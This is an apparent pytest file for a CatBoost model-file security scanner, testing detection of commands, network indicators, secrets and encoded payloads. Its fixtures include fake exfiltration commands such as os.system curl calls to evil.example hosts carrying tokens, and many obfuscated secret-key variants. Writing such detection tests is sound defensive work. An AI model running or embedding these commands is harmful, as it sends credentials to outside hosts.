"""Tests for CatBoost .cbm scanner."""

from __future__ import annotations

import base64
import struct
from pathlib import Path

import pytest

from modelaudit.analysis.unified_context import UnifiedMLContext
from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.integrations.sarif_formatter import format_sarif_output
from modelaudit.scanners import get_scanner_for_file
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.catboost_scanner import (
    CatBoostScanner,
    _format_evidence_for_display,
)
from modelaudit.utils.file.detection import detect_file_format, detect_file_format_from_magic


def _build_cbm(core_strings: list[str], trailing_strings: list[str] | None = None) -> bytes:
    core_blob = b"\x00".join(s.encode("utf-8") for s in core_strings)
    trailing_blob = b"\x00".join(s.encode("utf-8") for s in (trailing_strings or []))
    return b"CBM1" + struct.pack("<I", len(core_blob)) + core_blob + trailing_blob


def test_can_handle_valid_cbm_file(tmp_path: Path) -> None:
    model_path = tmp_path / "safe.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "feature_names",
                "loss_function",
                "metadata",
                "cat_feature_hash_to_string",
            ],
        ),
    )

    assert CatBoostScanner.can_handle(str(model_path)) is True


def test_can_handle_rejects_non_cbm_content_with_cbm_extension(tmp_path: Path) -> None:
    fake_path = tmp_path / "renamed.cbm"
    fake_path.write_bytes(b"not a catboost model")

    assert CatBoostScanner.can_handle(str(fake_path)) is False


def test_can_handle_accepts_corrupt_cbm_magic_for_fail_closed_scan(tmp_path: Path) -> None:
    corrupt_path = tmp_path / "corrupt.cbm"
    corrupt_path.write_bytes(b"CBM1" + struct.pack("<I", 128) + b"tiny")

    assert CatBoostScanner.can_handle(str(corrupt_path)) is True


def test_scan_benign_cbm_has_no_critical_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "benign.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "feature_names",
                "system_temperature",
                "exec_time_ms",
                "cat_feature_hash_to_string",
                "class_names",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    assert all(issue.severity != IssueSeverity.CRITICAL for issue in result.issues)

    header_checks = [check for check in result.checks if check.name == "CatBoost Header Signature Check"]
    assert header_checks
    assert header_checks[0].status == CheckStatus.PASSED


def test_scan_corrupt_cbm_reports_structured_parse_failure(tmp_path: Path) -> None:
    model_path = tmp_path / "corrupt.cbm"
    # Declared core size is larger than the available data.
    model_path.write_bytes(b"CBM1" + struct.pack("<I", 128) + b"tiny")

    result = CatBoostScanner().scan(str(model_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["catboost_structure_parse_failed"]
    assert any(
        check.name == "CatBoost Core Section Bounds Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert any(
        check.name == "CatBoost Structure Parsing" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_corrupt_cbm_aggregate_exit_code_is_inconclusive(tmp_path: Path) -> None:
    model_path = tmp_path / "corrupt.cbm"
    model_path.write_bytes(b"CBM1" + struct.pack("<I", 128) + b"tiny")

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    metadata = result.file_metadata[str(model_path)]
    assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "catboost_structure_parse_failed" in metadata["scan_outcome_reasons"]
    assert result.success is False
    assert determine_exit_code(result) == 2


def test_scan_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "unreadable.cbm"
    model_path.write_bytes(_build_cbm(["feature_names", "safe_metadata"]))

    def raise_os_error(
        _self: CatBoostScanner,
        _path: str,
        _file_size: int,
        _result: ScanResult,
    ) -> tuple[bytes, bytes, int, int]:
        raise OSError("simulated storage read failure")

    monkeypatch.setattr(CatBoostScanner, "_parse_sections", raise_os_error)

    direct = CatBoostScanner().scan(str(model_path))
    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    read_checks = [check for check in direct.checks if check.name == "CatBoost File Read"]
    assert len(read_checks) == 1
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].details["analysis_incomplete"] is True
    assert read_checks[0].details["scan_outcome_reason"] == "catboost_read_failed"
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "catboost_read_failed" in direct.metadata["scan_outcome_reasons"]
    metadata = aggregate.file_metadata[str(model_path)]
    assert "catboost_read_failed" in metadata["scan_outcome_reasons"]
    assert not [
        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert determine_exit_code(aggregate) == 2


def test_scan_bounded_parse_marks_uninspected_catboost_bytes_inconclusive(tmp_path: Path) -> None:
    model_path = tmp_path / "bounded.cbm"
    model_path.write_bytes(_build_cbm(["feature_names", "safe_metadata" * 16], trailing_strings=["late-safe"]))

    result = CatBoostScanner(config={"catboost_core_scan_budget": 8, "catboost_trailing_scan_budget": 0}).scan(
        str(model_path)
    )

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "catboost_bounded_parse_incomplete" in result.metadata["scan_outcome_reasons"]
    bounded_checks = [check for check in result.checks if check.name == "CatBoost Bounded Parse Check"]
    assert len(bounded_checks) == 1
    assert bounded_checks[0].status == CheckStatus.FAILED
    assert bounded_checks[0].details["analysis_incomplete"] is True


def test_scan_string_extraction_limit_marks_late_payload_analysis_inconclusive(tmp_path: Path) -> None:
    model_path = tmp_path / "bounded-strings.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "safe_fragment_one",
                "safe_fragment_two",
                "python -c \"import os; os.system('curl https://evil.example/webhook')\"",
            ],
        ),
    )

    result = CatBoostScanner(config={"catboost_max_extracted_strings": 2}).scan(str(model_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "catboost_string_extraction_limit_exceeded" in result.metadata["scan_outcome_reasons"]
    budget_checks = [check for check in result.checks if check.name == "CatBoost Text Fragment Budget"]
    assert len(budget_checks) == 1
    assert budget_checks[0].status == CheckStatus.FAILED
    assert budget_checks[0].details["truncated_sections"] == ["core"]
    assert budget_checks[0].details["analysis_incomplete"] is True


def test_scan_string_extraction_exact_limit_preserves_clean_result(tmp_path: Path) -> None:
    model_path = tmp_path / "bounded-strings-benign.cbm"
    model_path.write_bytes(_build_cbm(["safe_fragment_one", "safe_fragment_two"]))

    result = CatBoostScanner(config={"catboost_max_extracted_strings": 2}).scan(str(model_path))

    assert result.success is True
    assert "scan_outcome" not in result.metadata
    budget_checks = [check for check in result.checks if check.name == "CatBoost Text Fragment Budget"]
    assert len(budget_checks) == 1
    assert budget_checks[0].status == CheckStatus.PASSED
    assert budget_checks[0].details["analysis_incomplete"] is False


def test_scan_string_extraction_limit_aggregate_is_inconclusive_and_uncached(tmp_path: Path) -> None:
    model_path = tmp_path / "bounded-strings.cbm"
    model_path.write_bytes(_build_cbm(["safe_fragment_one", "safe_fragment_two"]))
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(model_path),
            catboost_max_extracted_strings=1,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(model_path),
            catboost_max_extracted_strings=1,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for result in (first, second):
            metadata = result.file_metadata[str(model_path)]
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert "catboost_string_extraction_limit_exceeded" in metadata["scan_outcome_reasons"]
            assert determine_exit_code(result) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_detects_correlated_command_and_network_indicators(tmp_path: Path) -> None:
    model_path = tmp_path / "malicious.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                "python -c \"import os; os.system('curl https://evil.example/webhook')\"",
                "callback=https://evil.example/webhook",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    correlation_checks = [check for check in result.checks if check.name == "Command/Network Correlation Check"]
    assert correlation_checks
    assert correlation_checks[0].status == CheckStatus.FAILED
    assert correlation_checks[0].severity == IssueSeverity.CRITICAL
    assert correlation_checks[0].details["same_fragment_correlation"] is True


def test_whitelisted_catboost_downgrades_cross_fragment_correlation(tmp_path: Path) -> None:
    from modelaudit.whitelists import POPULAR_MODELS

    model_path = tmp_path / "cross_fragment.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                "os.system('echo benchmark')",
                "callback=https://collector.evil.example/upload",
            ],
        ),
    )
    scanner = CatBoostScanner()
    scanner.context = UnifiedMLContext(
        file_path=model_path,
        file_size=model_path.stat().st_size,
        file_type=".cbm",
        model_id=next(iter(POPULAR_MODELS)),
        model_source="huggingface",
    )

    result = scanner.scan(str(model_path))

    correlation_check = next(check for check in result.checks if check.name == "Command/Network Correlation Check")
    assert correlation_check.status == CheckStatus.FAILED
    assert correlation_check.severity == IssueSeverity.INFO
    assert correlation_check.details["same_fragment_correlation"] is False
    assert correlation_check.details["whitelist_downgrade"] is True


def test_scan_detects_network_indicator_warning(tmp_path: Path) -> None:
    model_path = tmp_path / "network.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                "download_url=https://collector.evil.example/upload",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    network_checks = [check for check in result.checks if check.name == "Network Indicator Check"]
    assert network_checks
    assert network_checks[0].status == CheckStatus.FAILED
    assert network_checks[0].severity == IssueSeverity.WARNING


@pytest.mark.parametrize("indicator", ["8.8.8.8", "2001:4860:4860::8888"])
def test_scan_detects_public_ip_network_indicators(tmp_path: Path, indicator: str) -> None:
    model_path = tmp_path / "public_ip.cbm"
    model_path.write_bytes(_build_cbm([f"resolver={indicator}"]))

    result = CatBoostScanner().scan(str(model_path))

    network_check = next(check for check in result.checks if check.name == "Network Indicator Check")
    assert network_check.status == CheckStatus.FAILED
    assert network_check.severity == IssueSeverity.WARNING
    assert indicator in str(network_check.details)


@pytest.mark.parametrize(
    "indicator",
    ["999.999.999.999", "fd00::1", "ff02::1", "64:ff9b::192", "224.0.0.1", "240.0.0.1"],
)
def test_scan_ignores_invalid_or_private_ip_like_metadata(tmp_path: Path, indicator: str) -> None:
    model_path = tmp_path / "benign_ip_like_metadata.cbm"
    model_path.write_bytes(_build_cbm([f"model_version={indicator}"]))

    result = CatBoostScanner().scan(str(model_path))

    network_check = next(check for check in result.checks if check.name == "Network Indicator Check")
    assert network_check.status == CheckStatus.PASSED


@pytest.mark.parametrize("indicator", ["ff02::1", "64:ff9b::192", "224.0.0.1", "240.0.0.1"])
def test_scan_does_not_correlate_commands_with_non_public_ip_literals(tmp_path: Path, indicator: str) -> None:
    model_path = tmp_path / "non_public_ip_command.cbm"
    model_path.write_bytes(_build_cbm([f"os.system('echo {indicator}')"]))

    result = CatBoostScanner().scan(str(model_path))

    correlation_check = next(check for check in result.checks if check.name == "Command/Network Correlation Check")
    assert correlation_check.status == CheckStatus.PASSED


def test_scan_preserves_urls_in_catboost_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "network_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                (
                    "python -c \"import os; os.system('curl "
                    "https://cat_user:cat_pass@collector.evil.example/upload?token=CATBOOST_SECRET#frag')\""
                ),
                "download_url=https://cat_user:cat_pass@collector.evil.example/upload?token=CATBOOST_SECRET#frag",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    assert result.success is False
    assert all(
        len(example["excerpt"]) <= 160 for check in result.checks for example in check.details.get("matches", [])
    )
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    assert "https://cat_user:cat_pass@collector.evil.example/upload?token=CATBOOST_SECRET#frag" in failed_details


def test_scan_preserves_non_url_secrets_in_catboost_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "command_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                (
                    "os.system('curl -H Authorization: Bearer sk-catboost-secret1234567890 "
                    "https://collector.evil.example/upload')"
                ),
                "os.system('id'); aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                "os.system('id'); client_secret='client-secret-value-abcdef'",
                r'os.system("id"); client_secret=\"C001_ESCAPED_SECRET_123456\"',
                r'os.system("id"); Authorization: Bearer \"C001_ESCAPED_BEARER_123456\"',
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    assert result.success is False
    assert all(
        len(example["excerpt"]) <= 160 for check in result.checks for example in check.details.get("matches", [])
    )
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    assert "os.system" in failed_details
    assert "collector.evil.example" in failed_details


def test_scan_preserves_nested_escaped_non_url_secrets_in_catboost_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "nested_escaped_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                r'os.system("id"); api_key=\\\"C001_NESTED_API_SECRET_123456\\\"',
                r'os.system("id"); Authorization: Bearer \\\"C001_NESTED_BEARER_SECRET_123456\\\"',
                r'os.system("id"); api_key=\C001_SLASH_API_SECRET_123456',
                r'os.system("id"); Authorization: \C001_SLASH_AUTH_SECRET_123456',
                r'os.system("id"); client_secret=\u0022C001_UNICODE_SECRET_123456\u0022',
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    assert result.success is True
    assert all(
        len(example["excerpt"]) <= 160 for check in result.checks for example in check.details.get("matches", [])
    )
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    assert "os.system" in failed_details


def test_scan_preserves_long_quoted_secret_suffixes_in_catboost_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "long_quoted_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                f'os.system("id"); api_key="prefix C001_LONG_SPACE_API_SECRET_123456{"a" * 5000}"',
                (f'os.system("id"); Authorization: Bearer "prefix;C001_LONG_SEMI_AUTH_SECRET_123456{"a" * 5000}"'),
                f'os.system("id"); Bearer "prefix C001_LONG_SPACE_BEARER_SECRET_123456{"a" * 5000}"',
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    assert result.success is True
    assert all(
        len(example["excerpt"]) <= 160 for check in result.checks for example in check.details.get("matches", [])
    )
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    assert "os.system" in failed_details


def test_scan_preserves_unicode_quoted_secret_suffixes_in_catboost_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "unicode_quoted_secret.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "metadata",
                r'os.system("id"); client_secret=\u0022prefix C001_UNICODE_SPACE_SECRET_123456\u0022',
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\u0022prefix;C001_UNICODE_AUTH_SECRET_123456\u0022"
                ),
                r'os.system("id"); Bearer \u0022prefix C001_UNICODE_BEARER_SECRET_123456\u0022',
                (
                    r'os.system("id"); client_secret='
                    r"\u005c\u0022prefix C001_ENCBACKSLASH_API_SECRET_123456\u005c\u0022"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\u005c\u0022prefix;C001_ENCBACKSLASH_AUTH_SECRET_123456\u005c\u0022"
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\u005c\u0022prefix C001_ENCBACKSLASH_BEARER_SECRET_123456\u005c\u0022"
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\\u005c\\u0022prefix C001_DOUBLEENC_API_SECRET_123456\\u005c\\u0022"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\\u005c\\u0022prefix;C001_DOUBLEENC_AUTH_SECRET_123456\\u005c\\u0022"
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\\u005c\\u0022prefix C001_DOUBLEENC_BEARER_SECRET_123456\\u005c\\u0022"
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\u005c\"prefix C001_MIXED_API_SECRET_123456\u005c\""
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\u005c\"prefix;C001_MIXED_AUTH_SECRET_123456\u005c\""
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\u005c\"prefix C001_MIXED_BEARER_SECRET_123456\u005c\""
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\\u005c\\\"prefix C001_DOUBLEMIXED_API_SECRET_123456\\u005c\\\""
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\\u005c\\\"prefix;C001_DOUBLEMIXED_AUTH_SECRET_123456\\u005c\\\""
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\\u005c\\\"prefix C001_DOUBLEMIXED_BEARER_SECRET_123456\\u005c\\\""
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\x22prefix C001_HEX_API_SECRET_123456\x22"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\x22prefix;C001_HEX_AUTH_SECRET_123456\x22"
                ),
                r'os.system("id"); Bearer \x22prefix C001_HEX_BEARER_SECRET_123456\x22',
                (
                    r'os.system("id"); client_secret='
                    r"\x5c\x22prefix C001_HEXBACKSLASH_API_SECRET_123456\x5c\x22"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\x5c\x22prefix;C001_HEXBACKSLASH_AUTH_SECRET_123456\x5c\x22"
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\u005c\x22prefix C001_UNICODE_HEX_BEARER_SECRET_123456\u005c\x22"
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\x5c\"prefix C001_HEXMIXED_API_SECRET_123456\x5c\""
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\042prefix C001_OCTAL_API_SECRET_123456\042"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\042prefix;C001_OCTAL_AUTH_SECRET_123456\042"
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\U00000022prefix C001_LONGU_BEARER_SECRET_123456\U00000022"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\u{22}prefix;C001_JSU_AUTH_SECRET_123456\u{22}"
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\134\042prefix C001_OCTALBACKSLASH_API_SECRET_123456\134\042"
                ),
                (
                    r'os.system("id"); client_secret='
                    r"\42prefix C001_SHORTOCT_API_SECRET_123456\42"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\42prefix;C001_SHORTOCT_AUTH_SECRET_123456\42"
                ),
                (
                    r'os.system("id"); Bearer '
                    r"\u{0022}prefix C001_PADJS_BEARER_SECRET_123456\u{0022}"
                ),
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\u{005c}\u{0022}prefix;C001_PADJSBS_AUTH_SECRET_123456\u{005c}\u{0022}"
                ),
                'os.system("id"); client_secret="""prefix C001_TRIPLE_API_SECRET_123456"""',
                'os.system("id"); Authorization: Bearer """prefix;C001_TRIPLE_AUTH_SECRET_123456"""',
                'os.system("id"); client_secret=r"prefix C001_PREFIX_API_SECRET_123456"',
                'os.system("id"); Authorization: Bearer f"prefix;C001_PREFIX_AUTH_SECRET_123456"',
                r'os.system("id"); client_secret=\uu0022prefix C001_UU_API_SECRET_123456\uu0022',
                r'os.system("id"); client_secret=\"\"\"prefix C001_ESCTRIPLE_API_SECRET_123456\"\"\"',
                (
                    r'os.system("id"); Authorization: Bearer '
                    r"\u0022\u0022\u0022prefix;C001_UNITRIPLE_AUTH_SECRET_123456\u0022\u0022\u0022"
                ),
                (
                    r'os.system("id"); client_secret='
                    r"r\u0022\u0022\u0022prefix C001_PUNITRIPLE_API_SECRET_123456\u0022\u0022\u0022"
                ),
                'os.system("id"); client_secret=("prefix C001_PAREN_API_SECRET_123456")',
                'os.system("id"); client_secret="prefix " "C001_CONCAT_API_SECRET_123456"',
                'os.system("id"); client_secret="prefix " """C001_CONCAT_TRIPLE_SECRET_123456"""',
                'os.system("id"); client_secret="prefix " + "C001_PLUS_API_SECRET_123456"',
                'os.system("id"); client_secret=("prefix " + "C001_PARENPLUS_API_SECRET_123456")',
                'os.system("id"); client_secret="prefix " + """C001_PLUSTRIPLE_API_SECRET_123456"""',
                'os.system("id"); client_secret="prefix %s" % "C001_PERCENT_API_SECRET_123456"',
                'os.system("id"); client_secret=("prefix %s" % "C001_PARENPERCENT_API_SECRET_123456")',
                "os.system(\"id\"); client_secret=''.join(('prefix ', 'C001_JOIN_API_SECRET_123456'))",
                'os.system("id"); client_secret="prefix {}".format("C001_FORMAT_API_SECRET_123456")',
                'os.system("id"); client_secret="" or "C001_OR_API_SECRET_123456"',
                'os.system("id"); client_secret="decoy" if False else "C001_ELSE_API_SECRET_123456"',
                'os.system("id"); client_secret=str("C001_CALLFIRST_API_SECRET_123456")',
                'os.system("id"); client_secret=["C001_LISTFIRST_API_SECRET_123456"][0]',
                'os.system("id"); client_secret=(lambda: "C001_LAMBDAFIRST_API_SECRET_123456")()',
                'os.system("id"); client_secret=str("token=decoy C001_INNERPREFIX_API_SECRET_123456")',
                r'os.system("id"); client_secret=str("quote: \" token=decoy C001_ESCINNER_API_SECRET_123456")',
                'config={"client_secret": "C001_JSONKEY_CLIENT_SECRET_123456"}; os.system("id")',
                'config={"api_key": "C001_JSONKEY_API_SECRET_123456"}; os.system("id")',
                r'config={"client\u005fsecret": "C001_KEYUNICODE_CLIENT_SECRET_123456"}; os.system("id")',
                r'config={"api\x5fkey": "C001_KEYHEX_API_SECRET_123456"}; os.system("id")',
                r'config={"client\U0000005fsecret": "C001_KEYLONGU_SECRET_123456"}; os.system("id")',
                r'config={"api\N{LOW LINE}key": "C001_KEYNAMED_SECRET_123456"}; os.system("id")',
                'config={"client" + "_secret": "C001_KEYPLUS_SECRET_123456"}; os.system("id")',
                'config={"api" "_key": "C001_KEYIMPLICIT_SECRET_123456"}; os.system("id")',
                'config={"client%s" % "_secret": "C001_KEYPERCENT_SECRET_123456"}; os.system("id")',
                'config={"client{}".format("_secret"): "C001_KEYFORMAT_SECRET_123456"}; os.system("id")',
                'config={"client{suffix}".format(suffix="_secret"): "C001_KEYKWFORMAT_SECRET_123456"}; os.system("id")',
                'config={f"client{\'_secret\'}": "C001_KEYFSTRING_SECRET_123456"}; os.system("id")',
                'config={f"client{\'_secret\'!s}": "C001_KEYFCONV_SECRET_123456"}; os.system("id")',
                'config={f"client{\'_secret\':s}": "C001_KEYFSPEC_SECRET_123456"}; os.system("id")',
                'config={str("client_secret"): "C001_KEYSTRCALL_SECRET_123456"}; os.system("id")',
                'config={"client_secret".strip(): "C001_KEYSTRIP_SECRET_123456"}; os.system("id")',
                'config={"".join(("client", "_secret")): "C001_KEYJOIN_SECRET_123456"}; os.system("id")',
                'config={"__client_secret__".strip("_"): "C001_KEYSTRIPARG_SECRET_123456"}; os.system("id")',
                'config={"clientXsecret".replace("X", "_"): "C001_KEYREPLACE_SECRET_123456"}; os.system("id")',
                'config={("client_secret",)[0]: "C001_KEYINDEX_SECRET_123456"}; os.system("id")',
                'config={"terces_tneilc"[::-1]: "C001_KEYREVERSE_SECRET_123456"}; os.system("id")',
                'config={"TERCES_TNEILC"[::-1].lower(): "C001_KEYREVERSELOWER_SECRET_123456"}; os.system("id")',
                'config={("terces_tneilc" * 1)[::-1]: "C001_KEYREVERSEMULT_SECRET_123456"}; os.system("id")',
                'config={"TERCES_TNEILC"[::-1].swapcase(): "C001_KEYSWAPCASE_SECRET_123456"}; os.system("id")',
                'config={"client_secret".zfill(0): "C001_KEYZFILL_SECRET_123456"}; os.system("id")',
                'config={("client" + "_secret").zfill(0): "C001_KEYCOMPOSEDZFILL_SECRET_123456"}; os.system("id")',
                'config={"client_secret".expandtabs(): "C001_KEYEXPANDTABS_SECRET_123456"}; os.system("id")',
                'config={("client_secret" or "public"): "C001_KEYBOOLOR_SECRET_123456"}; os.system("id")',
                'config={("client_secret" or "public".islower()): "C001_KEYBOOLSHORT_SECRET_123456"}; os.system("id")',
                'config={("client_secret" if "yes" else "public"): "C001_KEYTRUTHYIF_SECRET_123456"}; os.system("id")',
                'config={("client_secret" if 1 else "public"): "C001_KEYNUMIF_SECRET_123456"}; os.system("id")',
                (
                    'config={("client_secret" if ("yes",) else "public"): '
                    '"C001_KEYTUPLEIF_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if 1 == 1 else "public"): '
                    '"C001_KEYCOMPAREIF_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if (1 == 1 and 2 == 2) else "public"): '
                    '"C001_KEYANDCOMPARE_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if "x" in "x" else "public"): '
                    '"C001_KEYCONTAINS_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if "x" in "xy" == "xy" else "public"): '
                    '"C001_KEYCHAIN_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={("client_secret" if "x" in ("x",) else "public"): '
                    '"C001_KEYTUPMEM_SECRET_123456"}; os.system("id")'
                ),
                'config={{"x": "client_secret"}["x"]: "C001_KEYDICTLOOKUP_SECRET_123456"}; os.system("id")',
                (
                    'config={{"x": "client_secret", "unused": True}["x"]: '
                    '"C001_KEYDICTEXTRA_SECRET_123456"}; os.system("id")'
                ),
                'config={{"x": True, "x": "client_secret"}["x"]: "C001_KEYDUPLAST_SECRET_123456"}; os.system("id")',
                (
                    'config={{"x": "client" + "_secret", 1: True}["x"]: '
                    '"C001_KEYDICTNONSTRKEY_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={{"x": "client" + "_secret", **{}}["x"]: '
                    '"C001_KEYDICTUNPACK_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={{("x".islower() and "x"): True, "x": "client_secret"}["x"]: '
                    '"C001_KEYPREUNKNOWN_SECRET_123456"}; os.system("id")'
                ),
                (
                    'config={{**{("x".islower() and "x"): True}, "x": "client_secret"}["x"]: '
                    '"C001_KEYUNPACKUNKNOWN_SECRET_123456"}; os.system("id")'
                ),
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    assert result.success is True
    assert all(
        len(example["excerpt"]) <= 160 for check in result.checks for example in check.details.get("matches", [])
    )
    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
    assert "os.system" in failed_details


def test_catboost_encoded_evidence_escapes_terminal_controls(tmp_path: Path) -> None:
    decoded_base64 = ('os.system("id")\x1b[2J\x1b[HFORGED OUTPUT\n' + ("A" * 80)).encode()
    base64_payload = base64.b64encode(decoded_base64).decode()
    decoded_hex = b'os.system("id")\x1b[2J\rFORGED'
    hex_payload = "".join(f"\\x{byte:02x}" for byte in decoded_hex)
    model_path = tmp_path / "catboost_control_evidence.cbm"
    model_path.write_bytes(_build_cbm([base64_payload, hex_payload]))

    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    encoded_check = next(check for check in result.checks if check.name == "Encoded Payload Indicator Check")
    excerpts = [match["excerpt"] for match in encoded_check.details["matches"]]
    sarif = format_sarif_output(result, [str(model_path)])

    assert encoded_check.status == CheckStatus.FAILED
    assert all("\x1b" not in excerpt and "\n" not in excerpt and "\r" not in excerpt for excerpt in excerpts)
    assert "\x1b" not in sarif
    assert "\r" not in sarif
    assert any(r"\u001b" in excerpt for excerpt in excerpts)
    assert all(len(excerpt) <= 160 for excerpt in excerpts)


def test_false_positive_reduction_for_common_exec_system_words(tmp_path: Path) -> None:
    model_path = tmp_path / "false_positive_guard.cbm"
    model_path.write_bytes(
        _build_cbm(
            [
                "feature_system",
                "exec_time_ms",
                "system_feature_importance",
                "cat_feature_hash_to_string",
            ],
        ),
    )

    result = CatBoostScanner().scan(str(model_path))

    command_correlation = [check for check in result.checks if check.name == "Command/Network Correlation Check"]
    assert command_correlation
    assert command_correlation[0].status == CheckStatus.PASSED
    assert all(issue.severity != IssueSeverity.CRITICAL for issue in result.issues)


def test_catboost_regression_routes_to_catboost_scanner(tmp_path: Path) -> None:
    model_path = tmp_path / "route.cbm"
    model_path.write_bytes(_build_cbm(["feature_names", "loss_function"]))

    scanner = get_scanner_for_file(str(model_path))

    assert scanner is not None
    assert scanner.name == "catboost"

    assert detect_file_format_from_magic(str(model_path)) == "catboost"
    assert detect_file_format(str(model_path)) == "catboost"


@pytest.mark.parametrize("limit", [0, 1, 3, 4, 160])
def test_catboost_evidence_preview_is_bounded(limit: int) -> None:
    text = "token=raw-secret " + "x" * 10_000
    preview = _format_evidence_for_display(text, max_chars=limit)
    assert len(preview) <= limit
    assert preview == (text[:limit] if limit <= 3 else text[: limit - 3] + "...")


def test_catboost_evidence_preserves_raw_values_and_escapes_controls() -> None:
    text = 'os.system("id") token=raw-secret\x1b[2J\nFORGED\u202eOUTPUT\t\r\ud800'
    preview = _format_evidence_for_display(text, max_chars=500)
    assert "token=raw-secret" in preview
    assert all(character not in preview for character in ("\x1b", "\n", "\u202e", "\t", "\r", "\ud800"))
    assert all(escape in preview for escape in (r"\u001b", r"\n", r"\u202e", r"\t", r"\r", r"\ud800"))
    assert len(_format_evidence_for_display("\u202e" * 1000, max_chars=160)) == 160


@pytest.mark.parametrize(
    "character, escaped", [("\u2028", r"\u2028"), ("\U000e0001", r"\U000e0001"), ("\xa0", r"\u00a0")]
)
def test_catboost_escapes_non_printable_unicode(character: str, escaped: str) -> None:
